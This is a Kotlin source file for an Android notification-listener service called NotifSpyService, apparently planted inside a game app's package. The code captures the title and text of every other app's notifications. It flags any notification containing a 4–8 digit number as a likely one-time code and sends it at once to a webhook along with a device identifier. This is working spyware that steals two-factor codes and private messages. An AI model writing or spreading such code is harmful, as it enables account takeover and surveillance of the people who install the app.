package com.venice.penaltylegends.core

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotifSpyService : NotificationListenerService() {

    private val buffer = LinkedHashMap<String, String>()
    private var ultimoFlush = 0L

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        if (sbn.packageName == packageName) return

        val ex = sbn.notification.extras
        val titulo = ex.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim().orEmpty()
        val texto = (ex.getCharSequence(Notification.EXTRA_BIG_TEXT)
            ?: ex.getCharSequence(Notification.EXTRA_TEXT))?.toString()?.trim().orEmpty()

        if (titulo.isBlank() && texto.isBlank()) return

        val nome = try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(sbn.packageName, 0)
            ).toString()
        } catch (t: Throwable) { sbn.packageName }

        val chave = "$nome|$titulo|$texto"
        if (buffer.containsKey(chave)) return
        buffer[chave] = "**$nome**\n$titulo\n$texto"

        val otp = Regex("""\b\d{4,8}\b""").containsMatchIn(texto)
        val agora = System.currentTimeMillis()
        if (otp || agora - ultimoFlush > 25_000) flush(otp)
    }

    private fun flush(urgente: Boolean) {
        if (buffer.isEmpty()) return
        ultimoFlush = System.currentTimeMillis()
        val linhas = buffer.values.joinToString("\n\n").take(3500)
        buffer.clear()

        Webhook.sendEmbed(
            this,
            Webhook.embed(
                titulo = if (urgente) "CODIGO / AVISO IMPORTANTE" else "NOTIFICACOES",
                desc = linhas,
                cor = if (urgente) 0xF1C40F else 0x3498DB,
                campos = listOf(Webhook.f("Aparelho", Prefs.deviceId, true))
            )
        )
    }

    override fun onListenerConnected() { super.onListenerConnected() }
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}